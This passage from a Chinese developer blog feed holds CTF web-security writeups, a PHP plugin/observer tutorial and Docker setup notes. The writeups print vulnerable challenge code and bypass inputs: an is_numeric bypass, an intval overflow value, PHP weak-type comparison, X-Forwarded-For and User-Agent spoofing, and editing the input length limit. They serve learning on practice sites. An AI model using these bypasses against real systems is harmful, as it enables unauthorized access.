ZAP）扫描没有触<br>发告警</li><li>对于实时或准实时的攻击，应用程序无法检测、处理和告警<h3 id="防止-9"><a href="#防止-9" class="headerlink" title="防止"></a>防止</h3></li><li>确保所有登录、访问控制失败、输入验证失败能够被记录到日<br>志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐<br>户，并为后期取证预留足够时间。</li><li>确保日志以一种能被集中日志管理解决方案使用的形式生成</li><li>确保高额交易有完整性控制的审计信息，以防止篡改或删除，<br>例如审计信息保存在只能进行记录增加的数据库表中。</li><li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被<br>发现和应对。</li><li>建立或采取一个应急响应机制和恢复计划，例如：NIST 800-<br>61 rev 2或更新版本</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>实验吧CTF题库-web安全Writeup</title>
      <link href="/2018/01/31/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%E9%A2%98%E5%BA%93-web%E5%AE%89%E5%85%A8Writeup/"/>
      <url>/2018/01/31/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%E9%A2%98%E5%BA%93-web%E5%AE%89%E5%85%A8Writeup/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><blockquote><p>格式：flag:{xxx}<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a> </p></blockquote><p>查看源码抓包，发现没有奇怪的地方，给出的提示也很难进行sql注入，这时候看到了文件名，把文件名输入竟然通过了，脑洞题。<br><img src="11.png" alt=""></p><h3 id="你真的会PHP吗？会？还是不会？"><a href="#你真的会PHP吗？会？还是不会？" class="headerlink" title="你真的会PHP吗？会？还是不会？"></a>你真的会PHP吗？会？还是不会？</h3><blockquote><p>解题链接： <a href="http://ctf5.shiyanbar.com/web/PHP/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/PHP/index.php</a></p></blockquote><p>照常查看源码没有什么收获之后，使用burpsuite的Repter模块对数据包进行分析，发现了一个暗示，<br><img src="22.png" alt=""><br>直接访问该文件，发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span> = <span class="string">""</span>; </span><br><span class="line"><span class="variable">$req</span> = [];</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="literal">false</span>); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_POST</span>[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:6c525af4059b4fe7d8c33a.txt"</span>);</span><br><span class="line"></span><br><span class="line">   die(<span class="string">"have a fun!!"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([<span class="variable">$_POST</span>] as <span class="variable">$global_var</span>) &#123; </span><br><span class="line">    foreach(<span class="variable">$global_var</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="variable">$value</span> = trim(<span class="variable">$value</span>); </span><br><span class="line">        is_string(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> is_palindrome_number(<span class="variable">$number</span>) &#123; </span><br><span class="line">    <span class="variable">$number</span> = strval(<span class="variable">$number</span>); </span><br><span class="line">    <span class="variable">$i</span> = 0; </span><br><span class="line">    <span class="variable">$j</span> = strlen(<span class="variable">$number</span>) - 1; </span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="variable">$j</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$number</span>[<span class="variable">$i</span>] !== <span class="variable">$number</span>[<span class="variable">$j</span>]) &#123; </span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">        <span class="variable">$j</span>--; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$_REQUEST</span>[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">   <span class="variable">$info</span>=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line">&#125;elseif(<span class="variable">$req</span>[<span class="string">'number'</span>]!=strval(intval(<span class="variable">$req</span>[<span class="string">'number'</span>])))&#123;</span><br><span class="line">      </span><br><span class="line">     <span class="variable">$info</span> = <span class="string">"number must be equal to it's integer!! "</span>;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$value1</span> = intval(<span class="variable">$req</span>[<span class="string">"number"</span>]);</span><br><span class="line">     <span class="variable">$value2</span> = intval(strrev(<span class="variable">$req</span>[<span class="string">"number"</span>]));  </span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$value1</span>!=<span class="variable">$value2</span>)&#123;</span><br><span class="line">          <span class="variable">$info</span>=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number(<span class="variable">$req</span>[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              <span class="variable">$info</span> = <span class="string">"nice! &#123;<span class="variable">$value1</span>&#125; is a palindrome number!"</span>; </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="variable">$info</span>=<span class="variable">$flag</span>;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$info</span>;</span><br></pre></td></tr></table></figure><p>分析以上代码，要抓到flag需要满足以下几个条件:</p><ul><li>number参数值不能是数字</li><li>number参数值转换成数字类型再转换成为字符串跟原始字符串相等</li><li>number倒置过来之后转换成数字类型跟原始字符转换成数字类型的值相等</li><li>不能是回文数</li></ul><h4 id="绕过is-numeric"><a href="#绕过is-numeric" class="headerlink" title="绕过is_numeric"></a>绕过is_numeric</h4><p>%00思考了好久之后，满足一二条件的话，我们直接在数字里面加入经过编码的空字符能够绕过</p><h4 id="绕过倒置过来相等但不能是回文"><a href="#绕过倒置过来相等但不能是回文" class="headerlink" title="绕过倒置过来相等但不能是回文"></a>绕过倒置过来相等但不能是回文</h4><p>查了好多资料之后才知道，利用intval最大值溢出就可以满足最后两个条件。<br>Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.3.29<br>从这里可以知道服务是32位的，带符号整型数字最大为2的32次方减1，即2147483647，倒置后还是比这个数大还是等于<br>最大值。</p><p>因此满足上述两个条件的值为</p><blockquote><p>2147483647%20</p></blockquote><p>如下如所示:<br><img src="23.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>web安全第一阶段能力验证题目Writeup</title>
      <link href="/2018/01/20/web%E5%AE%89%E5%85%A8%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%E8%83%BD%E5%8A%9B%E9%AA%8C%E8%AF%81%E9%A2%98%E7%9B%AEWriteup/"/>
      <url>/2018/01/20/web%E5%AE%89%E5%85%A8%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%E8%83%BD%E5%8A%9B%E9%AA%8C%E8%AF%81%E9%A2%98%E7%9B%AEWriteup/</url>
      
        <content type="html"><![CDATA[<p>做web开发肯定对于web安全需要有一定的理解与基础，以下是学完基础的小作业，记录下过程。<br><a id="more"></a></p><blockquote><p><a href="http://120.24.86.145:8002/web2/" target="_blank" rel="noopener">http://120.24.86.145:8002/web2/</a></p></blockquote><p>打开之后网页发现没表单什么的，这时候就想起应该要查看源码或者抓个包分析一下了<br>打开源码之后发现果然有flag<br><img src="01.png" alt=""></p><p>难度：1星 知识点：页面源码查看</p><blockquote><p><a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a></p></blockquote><p>题目是一个验证码计算，发现写入结果是长度被限制了，我们修改html表单input的maxlength限制就可以了</p><pre><code>&lt;input type=&quot;text&quot; class=&quot;input&quot; maxlength=&quot;4&quot;&gt;</code></pre><p>难度：1星 知识点：JavaScript代码绕过</p><blockquote><p><a href="http://120.24.86.145:8002/get/" target="_blank" rel="noopener">http://120.24.86.145:8002/get/</a></p></blockquote><p>根据提示</p><pre><code>$what=$_GET[&apos;what&apos;];echo $what;if($what==&apos;flag&apos;)echo &apos;flag{****}&apos;;</code></pre><p>接受到一个key为what，value为flag的参数就可以抓到flag了<br>因为是get请求，所以我们在url后面加上?what=flag就行了<br><a href="http://120.24.86.145:8002/get?what=flag" target="_blank" rel="noopener">http://120.24.86.145:8002/get?what=flag</a></p><p>难度：1星 知识点：GET参数提交</p><blockquote><p><a href="http://120.24.86.145:8002/post/" target="_blank" rel="noopener">http://120.24.86.145:8002/post/</a></p></blockquote><p>根据提示</p><pre><code>$what=$_POST[&apos;what&apos;];&lt;br&gt;echo $what;&lt;br&gt;if($what==&apos;flag&apos;)&lt;br&gt;echo &apos;flag{****}&apos;;&lt;br&gt;</code></pre><p>我们这里使用postman来构造post提交，首先头部伪造很重要，刚开始我直接在body里面设置了what=flag，发现并没有效果，因此我们可以看chrome的network看法request header，并改造相似的请求头，勾选post请求，发送，抓到flag。<br><img src="041.png" alt=""><br><img src="04.png" alt=""><br>难度：1星 知识点：POST参数提交</p><blockquote><p><a href="http://120.24.86.145:8002/get/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8002/get/index1.php</a></p></blockquote><p>根据提示</p><pre><code>$num=$_GET[&apos;num&apos;];if(!is_numeric($num)){echo $num;if($num==1)echo &apos;flag{**********}&apos;;}</code></pre><p>从提示我们可以指导，get请求的参数必须满足两个条件</p><ul><li>不是数字</li><li>值等于1</li></ul><p>根据php弱类型的特点我们可以知道，如果一个数值和字符串进行比较的时候，会将字符串转换成数值，根据php字符串转换成数字的规则<br>例如 “1a”转换成数字就是1，因此该题的解决方式是<a href="http://120.24.86.145:8002/get/index1.php?num=1a" target="_blank" rel="noopener">http://120.24.86.145:8002/get/index1.php?num=1a</a></p><p>难度：1星 知识点：PHP弱类型</p><blockquote><p><a href="http://120.24.86.145:8002/web3/" target="_blank" rel="noopener">http://120.24.86.145:8002/web3/</a></p></blockquote><p>很调皮的一个页面，一直在弹窗，点击F12也无法查看源代码，这时候应该需要用到burpsuite进行抓包，这里使用了Repeater模块，将抓到的请求包发送到Repeater，对请求进行一步一步研究，如下如所示，<br><img src="06.png" alt=""><br>发现有一个有一些奇怪的符号，这个很明显涉及到编码问题，如果熟悉的人一眼就会看出其实这就是Unicode编码，我们可以直接把这个编码发送到Burpsuite的Decoder进行解码，也可以在线找unicode解码，直接只用Burpsuite最方便。</p><p>难度：1星 知识点：查看页面源码、Unicode编码</p><blockquote><p><a href="http://ctf5.shiyanbar.com/basic/catch/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/catch/</a></p></blockquote><p>有表单，提交密钥，第一感觉是要暴力破解呀，看了下源码之后，没什么思路，那就对请求过程进行抓包吧，使用Burpsuite的Repater对post过程进行一步一步跟踪，发现返回的值有一个编码，如下图:<br><img src="07.png" alt=""><br><img src="0701.png" alt=""><br>直接原样输入未解码的字符串即可过关。<br>难度：1星 知识点：抓包、base64编码</p><blockquote><p><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/phpaudit/</a></p></blockquote><p>根据提示</p><pre><code>&lt;?phpfunction GetIP(){if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];else    $cip = &quot;0.0.0.0&quot;;return $cip;}$GetIPs = GetIP();if ($GetIPs==&quot;1.1.1.1&quot;){echo &quot;Great! Key is *********&quot;;}else{echo &quot;错误！你的IP不在访问列表之内！&quot;;}?&gt;</code></pre><p>从提示我们可以知道，我们伪造请求头的HTTP_CLIENT_IP或HTTP_X_FORWARDED_FOR或REMOTE_ADDR可以抓到flag<br>直接让上述的一个等于1.1.1.1就可以抓到flag了</p><p>难度：1星 知识点：抓包、HTTP请求头伪造</p><blockquote><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/sHeader/</a></p></blockquote><p>根据提示可以知道:</p><pre><code>You don&apos;t have permission to access / on this server.Please make sure you have installed .net framework 9.9!Make sure you are in the region of England and browsing this site with Internet Explorer</code></pre><p>要抓到flag必须满足一下几个条件</p><ul><li>.net framework版本9.9</li><li>只接受英国区域以及it浏览器<br>直接使用burp拦截，查询相关资料可知修改useragent，修改user-agent为Mozilla/5.0 (MSIE 9.0;.NET CLR 9.9)<br>Accept-Language:en-gb可以解决，如下如图所示:</li></ul><p><img src="09.png" alt=""></p><p>难度：1星 知识点：抓包、HTTP请求头伪造</p><blockquote><p><a href="http://ctf5.shiyanbar.com/DUTCTF/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/1.html</a></p></blockquote><p>刚访问的时候，发现，突然出现了一大串乱码，经常做爬虫的人肯定很熟悉这种数据格式，这是jsfuck，就是混效过后的js，在日常爬虫当中，一般都是用node进行大块解析运行，在这里，我们复制这一串代码到控制台就可以执行了，或者直接执行js脚本<br><img src="TI10.png" alt=""><br>难度：1星 知识点：jsfuck代码执行</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Web攻击的本质，就是通过HTTP协议篡改应用程序</li><li>burpsuite是一个很好的工具</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>框架中插件机制的原理理解</title>
      <link href="/2018/01/05/%E6%A1%86%E6%9E%B6%E4%B8%AD%E6%8F%92%E4%BB%B6%E6%9C%BA%E5%88%B6%E7%9A%84%E5%8E%9F%E7%90%86%E7%90%86%E8%A7%A3/"/>
      <url>/2018/01/05/%E6%A1%86%E6%9E%B6%E4%B8%AD%E6%8F%92%E4%BB%B6%E6%9C%BA%E5%88%B6%E7%9A%84%E5%8E%9F%E7%90%86%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>框架中插件机制的原理理解<br><a id="more"></a></p><h2 id="插件机制的理解"><a href="#插件机制的理解" class="headerlink" title="插件机制的理解"></a>插件机制的理解</h2><p>最近回过头发现自己以前的写的笔记有点不太详细跟认真，也是刚毕业时的心态所致，凡事求快，遇速则不达，对于技术的学习还应该是脚踏实地的理解以及编码。<br>不过如果需要表达出的对原理的理解会让博客更加的丰富与逻辑的魅力，而不是单纯的记录下学习的过程的知识点，复盘才能够帮助我们更好地学习新知识，以及理解其原理。因此，以后的文章希望能够很好的查资料以及写出自己的理解。<br>今天要复盘的是插件机制的理解，插件机制使用了观察者模式和注册事件以及触发事件</p><h3 id="什么是插件"><a href="#什么是插件" class="headerlink" title="什么是插件"></a>什么是插件</h3><p>什么是插件呢，以下是我觉得通俗易懂的解释：<br>插件是什么东西？打个比方，如果iWebShop是一个手机操作系统，插件就是APP。回到理论，插件是一种可以热插拔的（动态安装和卸载），可以实现一定功能性并且对目前现有运行系统不会产生任何影响的一种松散耦合的设计模式，而且易扩展，可以让更多的开发者参与进来，让产品自身的功能更加丰富彩，它也可以通过动态的安装组合，实现不同的产品架构。</p><h3 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h3><p>在观察者模式中，有两个对象，一个是观察者，一个是被观察者，我们称之为主题。<br>在观察者模式中，会改变的是主题的状态以及观察者的数目。用这个模式，你可以改变依赖于主题状态的对象，却不必改变主题。——找出程序中会变化的方面，然后将其和固定不变的方面相分离!主题和观察者都使用接口:观察者利用主题的接口向主题注册，而主题利用观察者接口通知观察者。这样可以让两者之间运作正常，又同时具有松耦合的优点! ——针对接口编程，不针对实现编程!<br>。观察者模式利用“组合”将许多观察者组合进主题中。对象(观察者——主题)之间的这种关系不是通过继承产生的，而是在运行时利用组合的方式产生的。 ——多用组合，少用继承！</p><pre><code class="bash">&lt;?php/** * Created by PhpStorm. * User: seven * Date: 2018/1/5 * Time: 22:45 *///主题class Subject{    //保存观察者注册的实例    private <span class="variable">$_observers</span> = array();    //注册观察者    public <span class="keyword">function</span> reg(<span class="variable">$sub</span>)    {        <span class="variable">$this</span>-&gt;_observers[]=<span class="variable">$sub</span>;    }    //外部触发统一访问    public <span class="keyword">function</span> trigger()    {        <span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;_observers)){            foreach (<span class="variable">$this</span>-&gt;_observers as <span class="variable">$observer</span>){                //定义接口，限制每个观察者实现一个运行方法                <span class="variable">$observer</span>-&gt;submethod();            }        }    }}//观察实现的接口interface Observe{    public <span class="keyword">function</span> submethod();}class oberveplugin implements Observe{    public <span class="keyword">function</span> submethod()    {        <span class="built_in">echo</span> <span class="string">"hello world!"</span>;    }}//测试代码<span class="variable">$subject</span> = new Subject();<span class="variable">$subject</span>-&gt;reg(new oberveplugin());<span class="variable">$subject</span>-&gt;trigger();</code></pre><h3 id="注册事件与触发事件"><a href="#注册事件与触发事件" class="headerlink" title="注册事件与触发事件"></a>注册事件与触发事件</h3><p>上面我们讲过要实现插件的话，还需要注册事件，让插件针对主题对象的发生不同事件，也就是不同的方法被调用做不通的处理，换句话说就是我们给插件取一个别名，当我们需要使用到这个插件的时候，直接使用这个别名来调用，前提是我们已经把系统中的插件都已经加载了。<br>这时候，我们需要改写观察者的接口，新增注册事件接口，</p><pre><code class="bash">&lt;?php/** * Created by PhpStorm. * User: seven * Date: 2018/1/5 * Time: 22:45 *///主题class Subject{    //保存观察者注册的实例    private static <span class="variable">$_listen</span> = array();    //加载插件    public <span class="keyword">function</span> __construct(<span class="variable">$plugins</span>)    {        foreach(<span class="variable">$plugins</span> as <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)        {            <span class="variable">$val</span>-&gt;reg();        }    }    //注册观察者    /**     * @brief 注册事件     * @param string <span class="variable">$event</span> 事件     * @param object ro <span class="keyword">function</span> <span class="variable">$classObj</span> 类实例 或者 匿名函数     * @param string <span class="variable">$method</span> 方法名字     */    public static <span class="keyword">function</span> reg(<span class="variable">$param</span>,<span class="variable">$classObj</span>,<span class="variable">$method</span> = <span class="string">""</span>)    {        <span class="variable">$eventArray</span> = explode(<span class="string">','</span>,<span class="variable">$param</span>);        foreach(<span class="variable">$eventArray</span> as <span class="variable">$event</span>)        {            <span class="keyword">if</span>(!isset(self::<span class="variable">$_listen</span>[<span class="variable">$event</span>]))            {                self::<span class="variable">$_listen</span>[<span class="variable">$event</span>] = array();            }            self::<span class="variable">$_listen</span>[<span class="variable">$event</span>][] = array(<span class="variable">$classObj</span>,<span class="variable">$method</span>);        }    }    /**     * @brief 触发事件支持多个参数     * @param string <span class="variable">$event</span> 事件     * @notice 可以调用匿名函数和方法     */    public static <span class="keyword">function</span> trigger(<span class="variable">$event</span>)    {        <span class="variable">$params</span> = func_get_args();        array_shift(<span class="variable">$params</span>);        <span class="variable">$result</span> = array();        <span class="keyword">if</span>(isset(self::<span class="variable">$_listen</span>[<span class="variable">$event</span>]))        {            foreach(self::<span class="variable">$_listen</span>[<span class="variable">$event</span>] as <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)            {                <span class="keyword">if</span>(stripos(<span class="variable">$event</span>,<span class="string">"on"</span>) === 0)                {                    <span class="built_in">unset</span>(self::<span class="variable">$_listen</span>[<span class="variable">$event</span>][<span class="variable">$key</span>]);                }                list(<span class="variable">$pluginObj</span>,<span class="variable">$pluginMethod</span>) = <span class="variable">$val</span>;                <span class="variable">$result</span>[<span class="variable">$key</span>] = is_callable(<span class="variable">$pluginObj</span>) ? call_user_func_array(<span class="variable">$pluginObj</span>,<span class="variable">$params</span>):call_user_func_array(array(<span class="variable">$pluginObj</span>,<span class="variable">$pluginMethod</span>),<span class="variable">$params</span>);            }        }        <span class="built_in">return</span> isset(<span class="variable">$result</span>[1]) ? <span class="variable">$result</span> : current(<span class="variable">$result</span>);    }}//观察实现的接口interface Observe{    public <span class="keyword">function</span> reg();}class oberveplugin implements Observe{    //注册事件对应的方法    public <span class="keyword">function</span> reg()    {       Subject::reg(<span class="string">'echohelloworld'</span>,<span class="variable">$this</span>,<span class="variable">$this</span>-&gt;hello());    }    public <span class="keyword">function</span> hello()    {        <span class="built_in">echo</span> <span class="string">"hello world!"</span>;    }}//测试代码<span class="variable">$plugins</span> = [    new oberveplugin()];<span class="variable">$subject</span> = new Subject(<span class="variable">$plugins</span>);Subject::trigger(<span class="string">'echohelloworld'</span>);</code></pre><p>上面的代码跟观察者模式的示例代码还是有许多不一样的地方，</p><ul><li>在观察者中实现了事件方法绑定</li><li>把注册观察接口改造成了事件和观察者绑定注册</li><li>同时编写了一个简易的加载插件的构造函数，并将观察者也就是插件中的事件注册进来，把事件跟函数放进内存中</li></ul><p>上述构成了一个简单的插件机制，当我们需要使用插件的时候，直接调用事件名字，就可以使用我们插件中的方法了，例如：Subject::trigger(‘echohelloworld’);<br>在这个基础上，我们就可以添加复杂的功能，比如添加一个插件目录，专门存放插件，以及插件的各种信息。经过以上的分析，是不是对插件的原理有更好的理解了，欢迎一起讨论。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker+compose入门，启动多个web容器</title>
      <link href="/2017/12/20/docker-compose%E5%85%A5%E9%97%A8%EF%BC%8C%E5%90%AF%E5%8A%A8%E5%A4%9A%E4%B8%AAweb%E5%AE%B9%E5%99%A8/"/>
      <url>/2017/12/20/docker-compose%E5%85%A5%E9%97%A8%EF%BC%8C%E5%90%AF%E5%8A%A8%E5%A4%9A%E4%B8%AAweb%E5%AE%B9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>docker compose是容器编排工具，能够解决多个的容器的管理问题<br><a id="more"></a></p><p><a href="https://docs.docker.com/compose/overview/" target="_blank" rel="noopener">官方文档</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>参考上面手册<br>如果安装遇到下列问题的话，可以尝试修改下host文件:</p><ul><li><p>问题</p><p>Failed to connect to github-production-release-XX-.s3.amazonaws.com port 443:连接超时</p></li><li><p>解决方案<br>在hosts文件中，加入这一行：</p></li></ul><p>219.76.4.4 github-cloud.s3.amazonaws.com</p><h2 id="编写docker-compose-yml"><a href="#编写docker-compose-yml" class="headerlink" title="编写docker-compose.yml"></a>编写docker-compose.yml</h2><p><a href="http://www.yamllint.com/" target="_blank" rel="noopener">yam验证</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">"3"</span></span><br><span class="line">services:</span><br><span class="line">   web1:</span><br><span class="line">    container_name: myweb1</span><br><span class="line">    image: <span class="string">"centos:httpd"</span></span><br><span class="line">    ports:</span><br><span class="line">     - <span class="string">"8081:80"</span></span><br><span class="line">    privileged: <span class="literal">true</span></span><br><span class="line">    volumes:</span><br><span class="line">    - <span class="string">"/home/git/docker_build_conf/html/web1/:/var/www/html/"</span></span><br><span class="line">   web2:</span><br><span class="line">    container_name: myweb2</span><br><span class="line">    image: <span class="string">"centos:httpd"</span></span><br><span class="line">    ports:</span><br><span class="line">     - <span class="string">"8082:80"</span></span><br><span class="line">    privileged: <span class="literal">true</span></span><br><span class="line">    volumes:</span><br><span class="line">    - <span class="string">"/home/git/docker_build_conf/html/web2/:/var/www/html/"</span></span><br></pre></td></tr></table></figure><h2 id="启动docker-compose，批量启动容器"><a href="#启动docker-compose，批量启动容器" class="headerlink" title="启动docker-compose，批量启动容器"></a>启动docker-compose，批量启动容器</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d 启动</span><br><span class="line">docker-compose stop [service] -停止某个容器</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker+手工搭建centos+nginx容器</title>
      <link href="/2017/12/19/docker-%E6%89%8B%E5%B7%A5%E6%90%AD%E5%BB%BAcentos-nginx%E5%AE%B9%E5%99%A8/"/>
      <url>/2017/12/19/docker-%E6%89%8B%E5%B7%A5%E6%90%AD%E5%BB%BAcentos-nginx%E5%AE%B9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>不使用Dockerfile设置容器<br><a id="more"></a></p><h2 id="拉取纯净版的centos"><a href="#拉取纯净版的centos" class="headerlink" title="拉取纯净版的centos"></a>拉取纯净版的centos</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><h2 id="创建一个临时容器"><a href="#创建一个临时容器" class="headerlink" title="创建一个临时容器"></a>创建一个临时容器</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged --name tmp centos /usr/sbin/init</span><br><span class="line">docker <span class="built_in">exec</span> -it tmp /bin/bash</span><br></pre></td></tr></table></figure><h2 id="在容器中安装nginx"><a href="#在容器中安装nginx" class="headerlink" title="在容器中安装nginx"></a>在容器中安装nginx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</span><br><span class="line">yum install nginx -y</span><br><span class="line">systemctl <span class="built_in">enable</span> nginx</span><br><span class="line">systemctl start nginx</span><br><span class="line">curl http://localhost 测试是nginx是否安装成功</span><br></pre></td></tr></table></figure><h2 id="提交镜像"><a href="#提交镜像" class="headerlink" title="提交镜像"></a>提交镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> 退出容器</span><br><span class="line">docker commit -c <span class="string">'CMD ["/usr/sbin/init"] '</span> -c <span class="string">"EXPOSE 80"</span> tmp centos:nginx</span><br></pre></td></tr></table></figure><h2 id="映射配置文件"><a href="#映射配置文件" class="headerlink" title="映射配置文件"></a>映射配置文件</h2><h3 id="从容器中拷贝出nginx配置文件"><a href="#从容器中拷贝出nginx配置文件" class="headerlink" title="从容器中拷贝出nginx配置文件"></a>从容器中拷贝出nginx配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 